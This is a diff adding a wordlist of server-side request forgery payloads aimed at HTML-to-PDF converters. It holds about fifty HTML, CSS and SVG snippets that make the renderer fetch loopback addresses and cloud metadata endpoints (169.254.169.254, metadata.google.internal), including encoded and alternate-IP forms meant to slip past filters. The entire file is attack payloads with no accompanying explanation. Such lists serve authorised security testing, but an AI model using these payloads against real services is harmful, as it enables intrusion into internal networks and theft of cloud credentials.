@@ -1,0 +1,51 @@
+# HTML-to-PDF SSRF resource payloads
+<img src="http://127.0.0.1/">
+<img src="http://localhost/">
+<img src="http://169.254.169.254/latest/meta-data/">
+<img src="http://metadata.google.internal/computeMetadata/v1/">
+<img src="//127.0.0.1/">
+<img src="http://127.1/">
+<img src="http://2130706433/">
+<img src="http://[::1]/">
+<img src="http://example.com@127.0.0.1/">
+<img src="http://127.0.0.1#example.com/">
+<img src="http://127.0.0.1%252fadmin">
+<picture><source srcset="http://127.0.0.1/a.png"><img src="x"></picture>
+<source srcset="http://127.0.0.1/a.png">
+<video src="http://127.0.0.1/video.mp4"></video>
+<video poster="http://127.0.0.1/poster.png"></video>
+<audio src="http://127.0.0.1/audio.mp3"></audio>
+<track src="http://127.0.0.1/captions.vtt">
+<link rel="stylesheet" href="http://127.0.0.1/style.css">
+<link rel="preload" href="http://127.0.0.1/font.woff" as="font">
+<link rel="prefetch" href="http://127.0.0.1/prefetch">
+<link rel="dns-prefetch" href="//127.0.0.1">
+<iframe src="http://127.0.0.1/"></iframe>
+<iframe srcdoc="<img src='http://127.0.0.1/srcdoc.png'>"></iframe>
+<object data="http://127.0.0.1/"></object>
+<embed src="http://127.0.0.1/">
+<script src="http://127.0.0.1/probe.js"></script>
+<base href="http://127.0.0.1/"><img src="relative.png">
+<meta http-equiv="refresh" content="0;url=http://127.0.0.1/">
+<meta property="og:image" content="http://127.0.0.1/og.png">
+<body background="http://127.0.0.1/bg.png">
+<table background="http://127.0.0.1/table.png"><tr><td>x</td></tr></table>
+<td background="http://127.0.0.1/cell.png">x</td>
+<style>@import url("http://127.0.0.1/style.css");</style>
+<style>@font-face{font-family:zf;src:url(http://127.0.0.1/font.woff)}</style>
+<style>body{background-image:url("http://127.0.0.1/bg.png")}</style>
+<style>div{list-style-image:url("http://127.0.0.1/list.png")}</style>
+<style>@page{background:url("http://127.0.0.1/page.png")}</style>
+<div style="background:url(http://127.0.0.1/inline.png)">x</div>
+<svg><image href="http://127.0.0.1/"></image></svg>
+<svg><image xlink:href="http://127.0.0.1/" xmlns:xlink="http://www.w3.org/1999/xlink"></image></svg>
+<svg><use href="http://127.0.0.1/sprite.svg#x"></use></svg>
+<svg><feImage href="http://127.0.0.1/filter.png"></feImage></svg>
+<svg><style>@import url("http://127.0.0.1/svg.css");</style></svg>
+<svg><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="http://127.0.0.1/"></iframe></foreignObject></svg>
+<img src="http://0x7f000001/">
+<img src="http://0177.0.0.1/">
+<img src="http://127.0.0.1%2fadmin">
+<img src="http%3A%2F%2F127.0.0.1%2F">
+url(http://127.0.0.1%2fcss-url.png)
+@import url(http%3A%2F%2F127.0.0.1%2Fimport.css)
